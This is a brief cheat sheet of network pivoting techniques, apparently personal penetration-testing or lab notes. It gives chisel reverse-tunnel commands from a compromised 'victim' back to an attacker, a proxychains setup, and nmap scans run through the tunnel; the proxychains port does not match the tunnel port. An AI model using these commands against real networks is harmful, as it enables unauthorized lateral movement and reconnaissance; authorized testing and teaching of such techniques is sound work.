# Pivoting 

## Readme

https://cheatsheet.haax.fr/network/pivot_techniques/


##  Proxies

### Reverse proxy

Attacker <-------- Victim Pivot <-------- Next Victim

* In this scenario all ports from the victim pivot point aer redirected to attacker so attacker can access Next Victim, which
would be othervise not visible for his network adapter

./chisel server -p 3333 --reverse --socks5

./chisel_lin client 172.16.40.5:3333 R:7777:socks

sudo vim /etc/proxychains4.conf

socks5 127.0.0.1 3333

proxychains nmap -F 10.185.10.0/24

### Second pivot point Reverse Proxy

Attacker <-------- Victim Pivot 1 <-------- Victim Pivot 2 <-------- Next Victim

If second pviot point is needed then perform following actions:

Set up new server (this time non socks)

./chisel server --reverse --port 9902


Activate client on victims host

./chisel client 10.10.14.xxx:9902 R:443:127.0.0.1:443 

So now port 443 from victim can be accessed on Attacker via 127.0.0.1:443 


## scanning with nmap

* run for getting open ports
`seq 1 65535 | xargs -P 50 -I port proxychains -q nmap -p port -sT -T4 10.42.42.2 -oG 10.42.42.2 --open --append-output 10.42.42.2 -Pn -n`

* remove bad lines and save to log file
`grep '/open/' 10.42.42.2 | uniq > openports.log`

* then scan each port separately

